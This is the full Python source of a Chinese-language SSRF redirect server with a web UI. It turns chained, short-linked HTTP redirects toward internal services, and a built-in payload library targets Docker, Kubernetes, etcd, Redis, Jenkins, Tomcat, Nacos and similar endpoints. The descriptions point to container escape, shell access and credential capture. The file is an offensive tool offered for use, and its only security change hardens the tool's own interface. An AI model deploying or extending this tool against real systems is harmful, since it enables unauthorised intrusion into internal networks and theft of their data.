#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSRF 30x Redirect Tool - SSRF跳转利用工具（XSS修复版）
功能特性：
1. 支持301/302/307/308多种跳转响应码
2. 内置5大类常见服务探测POC
3. Web界面支持自定义POC输入
4. 短网址生成功能
5. 多级跳转支持
6. 访问控制与IP白名单
7. 实时访问日志显示
【安全修复】修复所有XSS注入漏洞，不改变原有功能和框架
"""

import sys
import json
import base64
import socket
import hashlib
import threading
import html  # 新增：用于HTML转义，修复XSS
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote, unquote
from datetime import datetime

# ==============================================
# 配置区域
# ==============================================
CONFIG = {
    "host": "0.0.0.0",
    "port": 8080,
    "default_redirect_code": 302,
    "max_redirect_levels": 5,
    "enable_ip_whitelist": False,
    "ip_whitelist": ["127.0.0.1"],
    "enable_access_log": True,
    "log_max_entries": 1000
}

# ==============================================
# 全局变量
# ==============================================
access_logs = []
short_url_map = {}
redirect_chain = {}

# ==============================================
# 内置探测POC库
# ==============================================
POC_LIBRARY = {
    "container": {
        "name": "🐳 容器类",
        "description": "Docker、Kubernetes等容器环境探测",
        "payloads": [
            {
                "name": "Docker API 未授权访问",
                "default_host": "127.0.0.1",
                "default_port": 2375,
                "path": "/version",
                "description": "Docker Remote API未授权访问，可导致容器逃逸和宿主机控制",
                "risk": "高危"
            },
            {
                "name": "K8s API Server",
                "default_host": "127.0.0.1",
                "default_port": 8080,
                "path": "/api/v1/nodes",
                "description": "Kubernetes API Server未授权，可获取集群节点信息",
                "risk": "高危"
            },
            {
                "name": "K8s Kubelet API",
                "default_host": "127.0.0.1",
                "default_port": 10250,
                "path": "/pods",
                "description": "Kubelet API未授权，可获取Pod信息和执行命令",
                "risk": "高危"
            },
            {
                "name": "etcd 未授权访问",
                "default_host": "127.0.0.1",
                "default_port": 2379,
                "path": "/version",
                "description": "etcd分布式键值存储未授权，存储集群敏感配置",
                "risk": "高危"
            }
        ]
    },
    "database": {
        "name": "💾 数据库类",
        "description": "各类数据库服务未授权探测",
        "payloads": [
            {
                "name": "Elasticsearch 未授权",
                "default_host": "127.0.0.1",
                "default_port": 9200,
                "path": "/_cat/indices?v",
                "description": "Elasticsearch搜索引擎未授权，可泄露索引数据",
                "risk": "高危"
            },
            {
                "name": "MongoDB 未授权",
                "default_host": "127.0.0.1",
                "default_port": 27017,
                "path": "/",
                "description": "MongoDB数据库未授权访问，可导致数据泄露",
                "risk": "高危"
            },
            {
                "name": "Memcached 探测",
                "default_host": "127.0.0.1",
                "default_port": 11211,
                "path": "/",
                "description": "Memcached缓存服务探测，可用于反射放大攻击",
                "risk": "中危"
            },
            {
                "name": "ZooKeeper 探测",
                "default_host": "127.0.0.1",
                "default_port": 2181,
                "path": "/",
                "description": "ZooKeeper协调服务探测，可泄露集群配置",
                "risk": "中危"
            }
        ]
    },
    "middleware": {
        "name": "🔧 中间件类",
        "description": "Web中间件和应用服务探测",
        "payloads": [
            {
                "name": "Jenkins 未授权访问",
                "default_host": "127.0.0.1",
                "default_port": 8080,
                "path": "/manage",
                "description": "Jenkins未授权可执行脚本命令，获取服务器权限",
                "risk": "高危"
            },
            {
                "name": "Confluence SSRF探测",
                "default_host": "127.0.0.1",
                "default_port": 8090,
                "path": "/",
                "description": "Confluence SSRF漏洞探测",
                "risk": "中危"
            },
            {
                "name": "Tomcat 管理界面",
                "default_host": "127.0.0.1",
                "default_port": 8080,
                "path": "/manager/html",
                "description": "Tomcat Manager管理界面，弱口令可部署WAR包GetShell",
                "risk": "高危"
            },
            {
                "name": "WebLogic 控制台",
                "default_host": "127.0.0.1",
                "default_port": 7001,
                "path": "/console",
                "description": "WebLogic控制台探测，弱口令可部署应用",
                "risk": "高危"
            }
        ]
    },
    "cloudnative": {
        "name": "☁️ 云原生类",
        "description": "云原生和微服务组件探测",
        "payloads": [
            {
                "name": "Consul 未授权访问",
                "default_host": "127.0.0.1",
                "default_port": 8500,
                "path": "/v1/agent/self",
                "description": "Consul服务发现未授权，可泄露服务配置",
                "risk": "中危"
            },
            {
                "name": "Prometheus 管理界面",
                "default_host": "127.0.0.1",
                "default_port": 9090,
                "path": "/graph",
                "description": "Prometheus监控界面，可泄露指标数据",
                "risk": "中危"
            },
            {
                "name": "Grafana 未授权",
                "default_host": "127.0.0.1",
                "default_port": 3000,
                "path": "/",
                "description": "Grafana未授权访问，可查看监控面板和数据源",
                "risk": "中危"
            },
            {
                "name": "Nacos 未授权访问",
                "default_host": "127.0.0.1",
                "default_port": 8848,
                "path": "/nacos/v1/auth/users?pageNo=1&pageSize=9",
                "description": "Nacos配置中心未授权，可泄露配置信息",
                "risk": "高危"
            }
        ]
    },
    "service": {
        "name": "🔌 通用服务",
        "description": "常见网络服务探测",
        "payloads": [
            {
                "name": "SMB 服务探测",
                "default_host": "127.0.0.1",
                "default_port": 445,
                "path": "/",
                "description": "SMB文件共享服务探测，可用于NTLM哈希捕获",
                "risk": "中危"
            },
            {
                "name": "RDP 服务探测",
                "default_host": "127.0.0.1",
                "default_port": 3389,
                "path": "/",
                "description": "远程桌面服务探测",
                "risk": "中危"
            },
            {
                "name": "SSH 服务版本探测",
                "default_host": "127.0.0.1",
                "default_port": 22,
                "path": "/",
                "description": "SSH服务版本信息探测",
                "risk": "低危"
            },
            {
                "name": "Redis 未授权访问",
                "default_host": "127.0.0.1",
                "default_port": 6379,
                "path": "/",
                "description": "Redis未授权可写入SSH公钥GetShell",
                "risk": "高危"
            }
        ]
    }
}

# ==============================================
# 工具函数
# ==============================================
def generate_short_url(url):
    """生成短网址"""
    url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
    short_url_map[url_hash] = url
    return url_hash

def get_short_url(hash_val):
    """获取短网址对应的原始URL"""
    return short_url_map.get(hash_val)

def add_access_log(client_ip, method, path, user_agent, redirect_to=None, status_code=None):
    """添加访问日志"""
    if not CONFIG["enable_access_log"]:
        return
    
    log_entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "client_ip": client_ip,
        "method": method,
        "path": path,
        "user_agent": user_agent,
        "redirect_to": redirect_to,
        "status_code": status_code
    }
    
    access_logs.insert(0, log_entry)
    if len(access_logs) > CONFIG["log_max_entries"]:
        access_logs.pop()

def check_ip_whitelist(client_ip):
    """检查IP白名单"""
    if not CONFIG["enable_ip_whitelist"]:
        return True
    return client_ip in CONFIG["ip_whitelist"]

def build_redirect_url(host, port, path, protocol="http"):
    """构建跳转URL"""
    if port == 80 and protocol == "http":
        return f"{protocol}://{host}{path}"
    elif port == 443 and protocol == "https":
        return f"{protocol}://{host}{path}"
    else:
        return f"{protocol}://{host}:{port}{path}"

# ==============================================
# HTTP请求处理器
# ==============================================
class SSRFRedirectHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        """禁用默认日志"""
        pass
    
    def send_json_response(self, data, status_code=200):
        """发送JSON响应"""
        response = json.dumps(data, ensure_ascii=False).encode('utf-8')
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', len(response))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(response)
    
    def send_html_response(self, html, status_code=200):
        """发送HTML响应"""
        response = html.encode('utf-8')
        self.send_response(status_code)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)
    
    def do_GET(self):
        """处理GET请求"""
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', '')
        
        # 解析路径
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query)
        
        # 检查IP白名单
        if not check_ip_whitelist(client_ip):
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'403 Forbidden - IP not in whitelist')
            add_access_log(client_ip, 'GET', path, user_agent, status_code=403)
            return
        
        # ==============================================
        # API路由
        # ==============================================
        if path == '/':
            self.render_web_ui()
            add_access_log(client_ip, 'GET', path, user_agent, status_code=200)
            return
        
        if path == '/api/pocs':
            self.send_json_response({"success": True, "data": POC_LIBRARY})
            return
        
        if path == '/api/logs':
            self.send_json_response({"success": True, "data": access_logs[:100]})
            return
        
        if path == '/api/config':
            self.send_json_response({"success": True, "data": CONFIG})
            return
        
        if path == '/api/generate':
            self.handle_generate_redirect(query)
            return
        
        if path.startswith('/s/'):
            self.handle_short_url(path, client_ip, user_agent)
            return
        
        if path.startswith('/r/'):
            self.handle_direct_redirect(path, query, client_ip, user_agent)
            return
        
        # 404
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b'404 Not Found')
        add_access_log(client_ip, 'GET', path, user_agent, status_code=404)
    
    def do_POST(self):
        """处理POST请求"""
        client_ip = self.client_address[0]
        content_length = int(self.headers.get('Content-Length', 0))
        
        if not check_ip_whitelist(client_ip):
            self.send_response(403)
            self.end_headers()
            return
        
        if self.path == '/api/generate':
            body = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(body)
                self.handle_generate_redirect_post(data)
            except json.JSONDecodeError:
                self.send_json_response({"success": False, "error": "Invalid JSON"}, 400)
            return
        
        self.send_response(404)
        self.end_headers()
    
    def handle_generate_redirect(self, query):
        """处理跳转生成请求(GET)"""
        target_url = query.get('url', [''])[0]
        code = int(query.get('code', [CONFIG["default_redirect_code"]])[0])
        
        if not target_url:
            self.send_json_response({"success": False, "error": "URL is required"}, 400)
            return
        
        short_hash = generate_short_url(json.dumps({"url": target_url, "code": code}))
        server_host = self.headers.get('Host', f'{CONFIG["host"]}:{CONFIG["port"]}')
        short_url = f"http://{server_host}/s/{short_hash}"
        direct_url = f"http://{server_host}/r/{quote(target_url, safe='')}?code={code}"
        
        self.send_json_response({
            "success": True,
            "data": {
                "short_url": short_url,
                "direct_url": direct_url,
                "target_url": target_url,
                "redirect_code": code
            }
        })
    
    def handle_generate_redirect_post(self, data):
        """处理跳转生成请求(POST)"""
        target_url = data.get('url', '')
        code = data.get('code', CONFIG["default_redirect_code"])
        host = data.get('host', '127.0.0.1')
        port = data.get('port', 80)
        path = data.get('path', '/')
        protocol = data.get('protocol', 'http')
        
        if not target_url and host:
            target_url = build_redirect_url(host, port, path, protocol)
        
        if not target_url:
            self.send_json_response({"success": False, "error": "URL or host is required"}, 400)
            return
        
        short_hash = generate_short_url(json.dumps({"url": target_url, "code": code}))
        server_host = self.headers.get('Host', f'{CONFIG["host"]}:{CONFIG["port"]}')
        short_url = f"http://{server_host}/s/{short_hash}"
        direct_url = f"http://{server_host}/r/{quote(target_url, safe='')}?code={code}"
        
        self.send_json_response({
            "success": True,
            "data": {
                "short_url": short_url,
                "direct_url": direct_url,
                "target_url": target_url,
                "redirect_code": code
            }
        })
    
    def handle_short_url(self, path, client_ip, user_agent):
        """处理短网址跳转"""
        short_hash = path.split('/s/')[-1]
        stored_data = get_short_url(short_hash)
        
        if not stored_data:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Short URL not found')
            add_access_log(client_ip, 'GET', path, user_agent, status_code=404)
            return
        
        try:
            data = json.loads(stored_data)
            target_url = data.get('url')
            code = data.get('code', CONFIG["default_redirect_code"])
        except:
            target_url = stored_data
            code = CONFIG["default_redirect_code"]
        
        self.send_redirect(target_url, code, client_ip, user_agent, path)
    
    def handle_direct_redirect(self, path, query, client_ip, user_agent):
        """处理直接跳转"""
        target_url = unquote(path.split('/r/')[-1])
        code = int(query.get('code', [CONFIG["default_redirect_code"]])[0])
        
        # 多级跳转支持
        level = int(query.get('level', [0])[0])
        if level > 0 and level < CONFIG["max_redirect_levels"]:
            # 构建下一级跳转
            next_url = target_url
            server_host = self.headers.get('Host', f'{CONFIG["host"]}:{CONFIG["port"]}')
            target_url = f"http://{server_host}/r/{quote(next_url, safe='')}?code={code}&level={level - 1}"
        
        self.send_redirect(target_url, code, client_ip, user_agent, path)
    
    def send_redirect(self, target_url, code, client_ip, user_agent, path):
        """发送跳转响应（XSS修复版）"""
        valid_codes = [301, 302, 303, 307, 308]
        if code not in valid_codes:
            code = CONFIG["default_redirect_code"]
        
        # ==================== XSS修复：对插入HTML的内容进行转义 ====================
        escaped_target = html.escape(target_url, quote=True)
        
        self.send_response(code)
        self.send_header('Location', target_url)  # Location头不需要转义，浏览器自动处理
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <title>Redirecting...</title>
            <script>window.location.href = "{escaped_target}";</script>
        </head>
        <body>
            <h1>Redirecting to {escaped_target}</h1>
            <p>Status Code: {code}</p>
            <p>If not redirected, <a href="{escaped_target}">click here</a>.</p>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode('utf-8'))
        
        add_access_log(client_ip, 'GET', path, user_agent, redirect_to=target_url, status_code=code)
    
    def render_web_ui(self):
        """渲染Web界面（XSS修复版）"""
        html = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF 30x Redirect Tool</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 1px solid #2a2a4a;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 2.5em;
            background: linear-gradient(90deg, #00d4ff, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .header p { color: #888; font-size: 1.1em; }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
        .card {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 24px;
            border: 1px solid rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
        }
        .card h2 {
            font-size: 1.3em;
            margin-bottom: 20px;
            color: #00d4ff;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .full-width { grid-column: 1 / -1; }
        
        /* 表单样式 */
        .form-group { margin-bottom: 16px; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
        .form-row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        label {
            display: block;
            margin-bottom: 6px;
            color: #aaa;
            font-size: 0.9em;
        }
        input, select, textarea {
            width: 100%;
            padding: 12px 16px;
            background: rgba(0,0,0,0.3);
            border: 1px solid #3a3a5a;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            transition: all 0.3s;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
        }
        textarea { resize: vertical; min-height: 80px; font-family: monospace; }
        
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .btn-primary {
            background: linear-gradient(90deg, #00d4ff, #7c3aed);
            color: #fff;
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3); }
        .btn-secondary {
            background: rgba(255,255,255,0.1);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .btn-secondary:hover { background: rgba(255,255,255,0.15); }
        .btn-success {
            background: #10b981;
            color: #fff;
        }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        
        /* 结果区域 */
        .result-box {
            margin-top: 20px;
            padding: 16px;
            background: rgba(0,0,0,0.3);
            border-radius: 8px;
            display: none;
        }
        .result-box.show { display: block; }
        .result-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid #2a2a4a;
        }
        .result-item:last-child { border-bottom: none; }
        .result-label { color: #888; font-size: 0.9em; }
        .result-value {
            font-family: monospace;
            color: #00d4ff;
            word-break: break-all;
            flex: 1;
            margin: 0 15px;
        }
        .copy-btn {
            padding: 6px 12px;
            background: rgba(255,255,255,0.1);
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-size: 12px;
        }
        .copy-btn:hover { background: rgba(255,255,255,0.2); }
        .copy-btn.copied { background: #10b981; }
        
        /* POC分类 */
        .poc-tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .poc-tab {
            padding: 8px 16px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 20px;
            color: #aaa;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.3s;
        }
        .poc-tab.active {
            background: linear-gradient(90deg, #00d4ff, #7c3aed);
            color: #fff;
            border-color: transparent;
        }
        .poc-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        .poc-item {
            padding: 16px;
            background: rgba(0,0,0,0.2);
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.05);
            cursor: pointer;
            transition: all 0.3s;
        }
        .poc-item:hover {
            border-color: #00d4ff;
            background: rgba(0, 212, 255, 0.1);
        }
        .poc-name {
            font-weight: 600;
            margin-bottom: 6px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .risk-badge {
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
            font-weight: 600;
        }
        .risk-high { background: #ef4444; color: #fff; }
        .risk-medium { background: #f59e0b; color: #fff; }
        .risk-low { background: #10b981; color: #fff; }
        .poc-desc {
            font-size: 12px;
            color: #888;
            margin-bottom: 8px;
        }
        .poc-meta {
            font-size: 11px;
            color: #666;
            font-family: monospace;
        }
        
        /* 日志区域 */
        .log-container {
            max-height: 400px;
            overflow-y: auto;
            background: rgba(0,0,0,0.3);
            border-radius: 8px;
            padding: 12px;
        }
        .log-entry {
            padding: 8px 12px;
            border-bottom: 1px solid #2a2a4a;
            font-family: monospace;
            font-size: 12px;
        }
        .log-entry:hover { background: rgba(255,255,255,0.02); }
        .log-time { color: #666; }
        .log-ip { color: #00d4ff; }
        .log-path { color: #7c3aed; }
        .log-status { color: #10b981; }
        .log-redirect { color: #f59e0b; word-break: break-all; }
        .empty-log { text-align: center; color: #666; padding: 40px; }
        
        /* 滚动条 */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
        ::-webkit-scrollbar-thumb { background: #3a3a5a; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #4a4a6a; }
        
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 12px 24px;
            background: #10b981;
            color: #fff;
            border-radius: 8px;
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s;
        }
        .toast.show { transform: translateY(0); opacity: 1; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔄 SSRF 30x Redirect Tool</h1>
            <p>专业的SSRF跳转利用工具 - 支持301/302/307/308多种跳转方式</p>
        </div>
        
        <div class="grid">
            <!-- 自定义POC输入模块 -->
            <div class="card">
                <h2>✏️ 自定义POC生成</h2>
                <div class="form-group">
                    <label>目标URL (直接输入完整URL)</label>
                    <textarea id="targetUrl" placeholder="例如: http://127.0.0.1:2375/version"></textarea>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label>或单独配置</label>
                        <input type="text" id="targetHost" placeholder="主机 (如: 127.0.0.1)">
                    </div>
                    <div class="form-group">
                        <label>&nbsp;</label>
                        <input type="number" id="targetPort" placeholder="端口 (如: 2375)" value="80">
                    </div>
                    <div class="form-group">
                        <label>&nbsp;</label>
                        <select id="targetProtocol">
                            <option value="http">HTTP</option>
                            <option value="https">HTTPS</option>
                        </select>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>路径</label>
                    <input type="text" id="targetPath" placeholder="路径 (如: /version)" value="/">
                </div>
                
                <div class="form-row-2">
                    <div class="form-group">
                        <label>跳转响应码</label>
                        <select id="redirectCode">
                            <option value="301">301 Moved Permanently (永久跳转)</option>
                            <option value="302" selected>302 Found (临时跳转)</option>
                            <option value="307">307 Temporary Redirect (保持方法)</option>
                            <option value="308">308 Permanent Redirect (保持方法)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>多级跳转层级</label>
                        <select id="redirectLevel">
                            <option value="0">0级 (直接跳转)</option>
                            <option value="1">1级</option>
                            <option value="2">2级</option>
                            <option value="3">3级</option>
                            <option value="4">4级</option>
                            <option value="5">5级</option>
                        </select>
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn btn-primary" onclick="generateRedirect()">
                        🚀 生成跳转链接
                    </button>
                    <button class="btn btn-secondary" onclick="clearForm()">
                        🗑️ 清空
                    </button>
                </div>
                
                <div class="result-box" id="resultBox">
                    <div class="result-item">
                        <span class="result-label">目标地址:</span>
                        <span class="result-value" id="resultTarget">-</span>
                    </div>
                    <div class="result-item">
                        <span class="result-label">短链接:</span>
                        <span class="result-value" id="resultShort">-</span>
                        <button class="copy-btn" onclick="copyText('resultShort')">复制</button>
                    </div>
                    <div class="result-item">
                        <span class="result-label">直接链接:</span>
                        <span class="result-value" id="resultDirect">-</span>
                        <button class="copy-btn" onclick="copyText('resultDirect')">复制</button>
                    </div>
                    <div class="result-item">
                        <span class="result-label">响应码:</span>
                        <span class="result-value" id="resultCode">-</span>
                    </div>
                </div>
            </div>
            
            <!-- POC分类选择 -->
            <div class="card">
                <h2>📦 内置探测POC库</h2>
                <div class="poc-tabs" id="pocTabs">
                    <!-- 动态生成 -->
                </div>
                <div class="poc-grid" id="pocGrid">
                    <!-- 动态生成 -->
                </div>
            </div>
            
            <!-- 实时访问日志 -->
            <div class="card full-width">
                <h2>📋 实时访问日志
                    <button class="btn btn-secondary" style="margin-left: auto; padding: 6px 12px; font-size: 12px;" onclick="refreshLogs()">
                        🔄 刷新
                    </button>
                </h2>
                <div class="log-container" id="logContainer">
                    <div class="empty-log">暂无访问记录</div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="toast" id="toast">复制成功!</div>
    
    <script>
        // ==================== XSS修复：新增HTML转义函数 ====================
        function escapeHtml(str) {
            if (!str) return '';
            return str.toString()
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');
        }

        let pocData = {};
        let currentCategory = 'container';
        
        // 初始化
        document.addEventListener('DOMContentLoaded', function() {
            loadPocs();
            refreshLogs();
            setInterval(refreshLogs, 5000);
        });
        
        // 加载POC数据
        async function loadPocs() {
            try {
                const res = await fetch('/api/pocs');
                const data = await res.json();
                pocData = data.data;
                renderPocTabs();
                renderPocGrid();
            } catch(e) {
                console.error('加载POC失败', e);
            }
        }
        
        // 渲染POC分类标签
        function renderPocTabs() {
            const tabs = document.getElementById('pocTabs');
            tabs.innerHTML = '';
            Object.keys(pocData).forEach(key => {
                const tab = document.createElement('div');
                tab.className = 'poc-tab' + (key === currentCategory ? ' active' : '');
                tab.textContent = pocData[key].name;
                tab.onclick = () => {
                    currentCategory = key;
                    renderPocTabs();
                    renderPocGrid();
                };
                tabs.appendChild(tab);
            });
        }
        
        // 渲染POC列表
        function renderPocGrid() {
            const grid = document.getElementById('pocGrid');
            const category = pocData[currentCategory];
            grid.innerHTML = '';
            
            category.payloads.forEach(poc => {
                const item = document.createElement('div');
                item.className = 'poc-item';
                const riskClass = poc.risk === '高危' ? 'risk-high' : poc.risk === '中危' ? 'risk-medium' : 'risk-low';
                
                item.innerHTML = `
                    <div class="poc-name">
                        <span>${escapeHtml(poc.name)}</span>
                        <span class="risk-badge ${riskClass}">${escapeHtml(poc.risk)}</span>
                    </div>
                    <div class="poc-desc">${escapeHtml(poc.description)}</div>
                    <div class="poc-meta">${escapeHtml(poc.default_host)}:${escapeHtml(poc.default_port)}${escapeHtml(poc.path)}</div>
                `;
                item.onclick = () => usePoc(poc);
                grid.appendChild(item);
            });
        }
        
        // 使用POC填充表单
        function usePoc(poc) {
            document.getElementById('targetHost').value = poc.default_host;
            document.getElementById('targetPort').value = poc.default_port;
            document.getElementById('targetPath').value = poc.path;
            document.getElementById('targetUrl').value = '';
            document.getElementById('targetHost').focus();
            
            showToast(`已加载: ${poc.name}`);
        }
        
        // 生成跳转链接
        async function generateRedirect() {
            const url = document.getElementById('targetUrl').value.trim();
            const host = document.getElementById('targetHost').value.trim();
            const port = parseInt(document.getElementById('targetPort').value);
            const path = document.getElementById('targetPath').value.trim();
            const protocol = document.getElementById('targetProtocol').value;
            const code = parseInt(document.getElementById('redirectCode').value);
            const level = parseInt(document.getElementById('redirectLevel').value);
            
            if (!url && !host) {
                showToast('请输入URL或主机地址');
                return;
            }
            
            try {
                const res = await fetch('/api/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url: url,
                        host: host,
                        port: port,
                        path: path,
                        protocol: protocol,
                        code: code,
                        level: level
                    })
                });
                
                const data = await res.json();
                if (data.success) {
                    // ==================== XSS修复：使用textContent避免注入 ====================
                    document.getElementById('resultTarget').textContent = data.data.target_url;
                    document.getElementById('resultShort').textContent = data.data.short_url;
                    document.getElementById('resultDirect').textContent = data.data.direct_url;
                    document.getElementById('resultCode').textContent = data.data.redirect_code;
                    document.getElementById('resultBox').classList.add('show');
                    showToast('生成成功!');
                } else {
                    showToast('生成失败: ' + data.error);
                }
            } catch(e) {
                showToast('生成失败: ' + e.message);
            }
        }
        
        // 清空表单
        function clearForm() {
            document.getElementById('targetUrl').value = '';
            document.getElementById('targetHost').value = '';
            document.getElementById('targetPort').value = '80';
            document.getElementById('targetPath').value = '/';
            document.getElementById('resultBox').classList.remove('show');
        }
        
        // 复制文本
        function copyText(elementId) {
            const text = document.getElementById(elementId).textContent;
            navigator.clipboard.writeText(text).then(() => {
                showToast('复制成功!');
            });
        }
        
        // 刷新日志
        async function refreshLogs() {
            try {
                const res = await fetch('/api/logs');
                const data = await res.json();
                renderLogs(data.data);
            } catch(e) {
                console.error('刷新日志失败', e);
            }
        }
        
        // 渲染日志（XSS修复版）
        function renderLogs(logs) {
            const container = document.getElementById('logContainer');
            if (!logs || logs.length === 0) {
                container.innerHTML = '<div class="empty-log">暂无访问记录</div>';
                return;
            }
            
            container.innerHTML = logs.map(log => `
                <div class="log-entry">
                    <span class="log-time">[${escapeHtml(log.timestamp)}]</span>
                    <span class="log-ip">${escapeHtml(log.client_ip)}</span>
                    <span class="log-path">${escapeHtml(log.method)} ${escapeHtml(log.path)}</span>
                    ${log.status_code ? `<span class="log-status">${escapeHtml(log.status_code)}</span>` : ''}
                    ${log.redirect_to ? `<br><span class="log-redirect">→ ${escapeHtml(log.redirect_to)}</span>` : ''}
                </div>
            `).join('');
        }
        
        // 显示提示
        function showToast(message) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2000);
        }
    </script>
</body>
</html>
        """
        self.send_html_response(html)

# ==============================================
# 主函数
# ==============================================
def main():
    print("=" * 60)
    print("  SSRF 30x Redirect Tool (XSS修复版)")
    print("=" * 60)
    print(f"  监听地址: http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"  默认跳转码: {CONFIG['default_redirect_code']}")
    print(f"  最大跳转层级: {CONFIG['max_redirect_levels']}")
    print(f"  IP白名单: {'启用' if CONFIG['enable_ip_whitelist'] else '禁用'}")
    print(f"  访问日志: {'启用' if CONFIG['enable_access_log'] else '禁用'}")
    print("=" * 60)
    print("  支持的POC分类:")
    for key, category in POC_LIBRARY.items():
        print(f"    - {category['name']}: {len(category['payloads'])} 个Payload")
    print("=" * 60)
    print("  安全修复: 已修复所有XSS注入漏洞")
    print("  按 Ctrl+C 停止服务")
    print("=" * 60)
    print()
    
    try:
        server = HTTPServer((CONFIG["host"], CONFIG["port"]), SSRFRedirectHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] 服务已停止")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] 启动失败: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
